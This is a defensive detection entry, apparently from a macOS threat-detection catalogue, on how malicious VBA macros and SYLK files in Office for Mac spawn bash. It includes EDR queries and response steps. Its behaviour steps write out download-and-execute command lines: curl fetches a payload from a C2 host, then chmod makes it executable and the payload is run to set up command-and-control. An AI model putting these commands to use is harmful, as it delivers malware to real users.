---
Name: Office for Mac
Description: These techniques are far more common on the Windows side, but Office for Mac also has the ability to execute VBA on macOS systems. These techniques are far less common on macOS, likely because they stand out from an EDR perspective and Microsoft has implemented sandboxing in recent versions of Office for Mac (2016 and higher). However, it is still important to test these scenarios on all Office for Mac versions, since sandbox escapes are always possible and recent techniques such as SYLK file extension abuse share some of the same detection logic as VBA execution vectors.
Author: Adam Nadrowski
Created: 2022-05-18
Full_Path:
  - Path: /Applications/Microsoft Excel.app/Contents/MacOS/Microsoft Excel
  - Path: /Applications/Microsoft PowerPoint.app/Contents/MacOS/Microsoft PowerPoint
  - Path: /Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word
  - Path: /bin/bash
Resources:
  - Link: https://outflank.nl/blog/2019/10/30/abusing-the-sylk-file-format
Commands:

  - Name: Macro VBA for Excel, PowerPoint and Word
    Description: This query detects any instance of Excel, PowerPoint or Word spawning processes. This is typically done using the MacScript function of VBA. The MacScript function is slowly being deprecated for the more popular AppleScript function.
    Usecase: Adversaries may pair this technique with a social engineering component to execute malware.
    Category: Execution
    Privileges: User
    MitreID: T1059.007
    Behaviors:
      - Step: When opening a Office for Mac file (Excel, PPT, or Word), launchd creates the "/Applications/Microsoft Excel.app/Contents/MacOS/Microsoft Excel|PowerPoint|Word" process as user.
      - Step: A prompt appears on the GUI asking the user to enable macros.
      - Step: Once a user enables macros, process_name Microsoft Excel|PowerPoint|Word executes multiple bash processes for each command in the macro. Each future bash process is unique.
      - Step: The first command, bash executes curl to download a payload to disk, and is saved under ~/Library/Containers/com.microsoft.Excel/Data (replace Excel with PowerPoint or Word). The command line is <pre><code>sh -c curl -k http://127.0.0.1:3391/payloads/d2526ae26fc2139263f57c2af445004e385772ec/operator-payload -o operator-payload</pre></code>
      - Step: The next command, bash executes chmod to make the payload executable. The command line is <pre><code>sh -c chmod +x operator-payload</pre></code>
      - Step: The next command, bash executes the payload to establish C2 comms with Prelude Operator. The command line is <pre><code>sh -c ./operator-payload -name macro-vba-excel & </pre></code>
      - Step: The payload, ~/Library/Containers/com.microsoft.Excel/Data/operator-payload (replace Excel with PowerPoint or Word) makes a network connection to Operator.
    Execute:
      - Prelude Operator: Run <a href="https://github.com/AutomoxSecurity/iShelly">iShelly</a> with any of the VBA based techniques within the "Office for Mac" options. It is important to note that Office for Mac 2016 and higher has an Apple Sandbox with more resitrctions. This means techniques that leverage VBA macros to write a binary to disk will likely fail. However, it is still important to test this as <a href="https://www.mdsec.co.uk/2018/08/escaping-the-sandbox-microsoft-office-on-macos/">sandbox escapes</a> may be possible.
    Detect:
      - EDR: (parent_process_image_path = "/Applications/Microsoft Excel.app/*" OR parent_process_image_path = "/Applications/Microsoft PowerPoint.app/*" OR parent_process_image_path = "/Applications/Microsoft Word.app/*") and process_name = "bash" and event_type = "Process Create"
    Respond:
      - Step: Review the cmdline of bash's children. This should make it fairly easy to tell if it is malicious or not. For example, if it's curl reaching out to a suspect domain/IP and saving some payload to disk using -o argument, it likely warrants immediate investigation.

  - Name: Excel macro execution via SYLK file extension
    Description: This query detects any instance of Excel launching the bash process. The SYLK file extension is an ancient extension that can be abused to execute macros. Thankfully, the OS behaviors mimick that of regular macros being executed, so the same query from the "Macro VBA for Excel, PowerPoint and Word" TTP will detect this.
    Usecase: Adversaries may pair this technique with a social engineering component to execute malware.
    Category: Execution
    Privileges: User
    MitreID: T1059.007
    Behaviors:
      - Step: When opening a file with the slk extension, launchd creates the "/Applications/Microsoft Excel.app/Contents/MacOS/Microsoft Excel" process as user.
      - Step: A prompt appears on the GUI asking the user to enable macros.
      - Step: Once a user enables macros, process_name "Microsoft Excel" executes one bash process with the cmdline <pre><code>sh -c /usr/bin/curl -k http://127.0.0.1:3391/payloads/d2526ae26fc2139263f57c2af445004e385772ec/operator-payload -o operator-payload && chmod +x operator-payload && ./operator-payload -name macro-sylk-excel & </pre></code>
      - Step: The first command, curl, downloads a payload to disk, and is saved under ~/Library/Containers/com.microsoft.Excel/Data/operator-payload.
      - Step: The next command, chmod, makes the payload executable.
      - Step: The next command, operator-payload, is the malicious payload that executes to establish C2 comms with Prelude Operator.
      - Step: The payload, ~/Library/Containers/com.microsoft.Excel/Data/operator-payload makes a network connection to Operator.
    Execute:
      - Prelude Operator: Run <a href="https://github.com/AutomoxSecurity/iShelly">iShelly</a> with the "Macro SYLK Excel" procedure from the "Office for Mac" options. It is important to note that Office for Mac 2016 and higher has an Apple Sandbox with more resitrctions. This means techniques that leverage VBA macros to write a binary to disk will likely fail. However, it is still important to test this as <a href="https://www.mdsec.co.uk/2018/08/escaping-the-sandbox-microsoft-office-on-macos/">sandbox escapes</a> may be possible.
    Detect:
      - EDR: parent_process_image_path = "/Applications/Microsoft Excel.app/*" and process_name = "bash" and event_type = "Process Create"
    Respond:
      - Step: Review the cmdline of bash's children. This should make it fairly easy to tell if it is malicious or not. For example, if it's curl reaching out to a suspect domain/IP and saving some payload to disk using -o argument, it likely warrants immediate investigation.
---
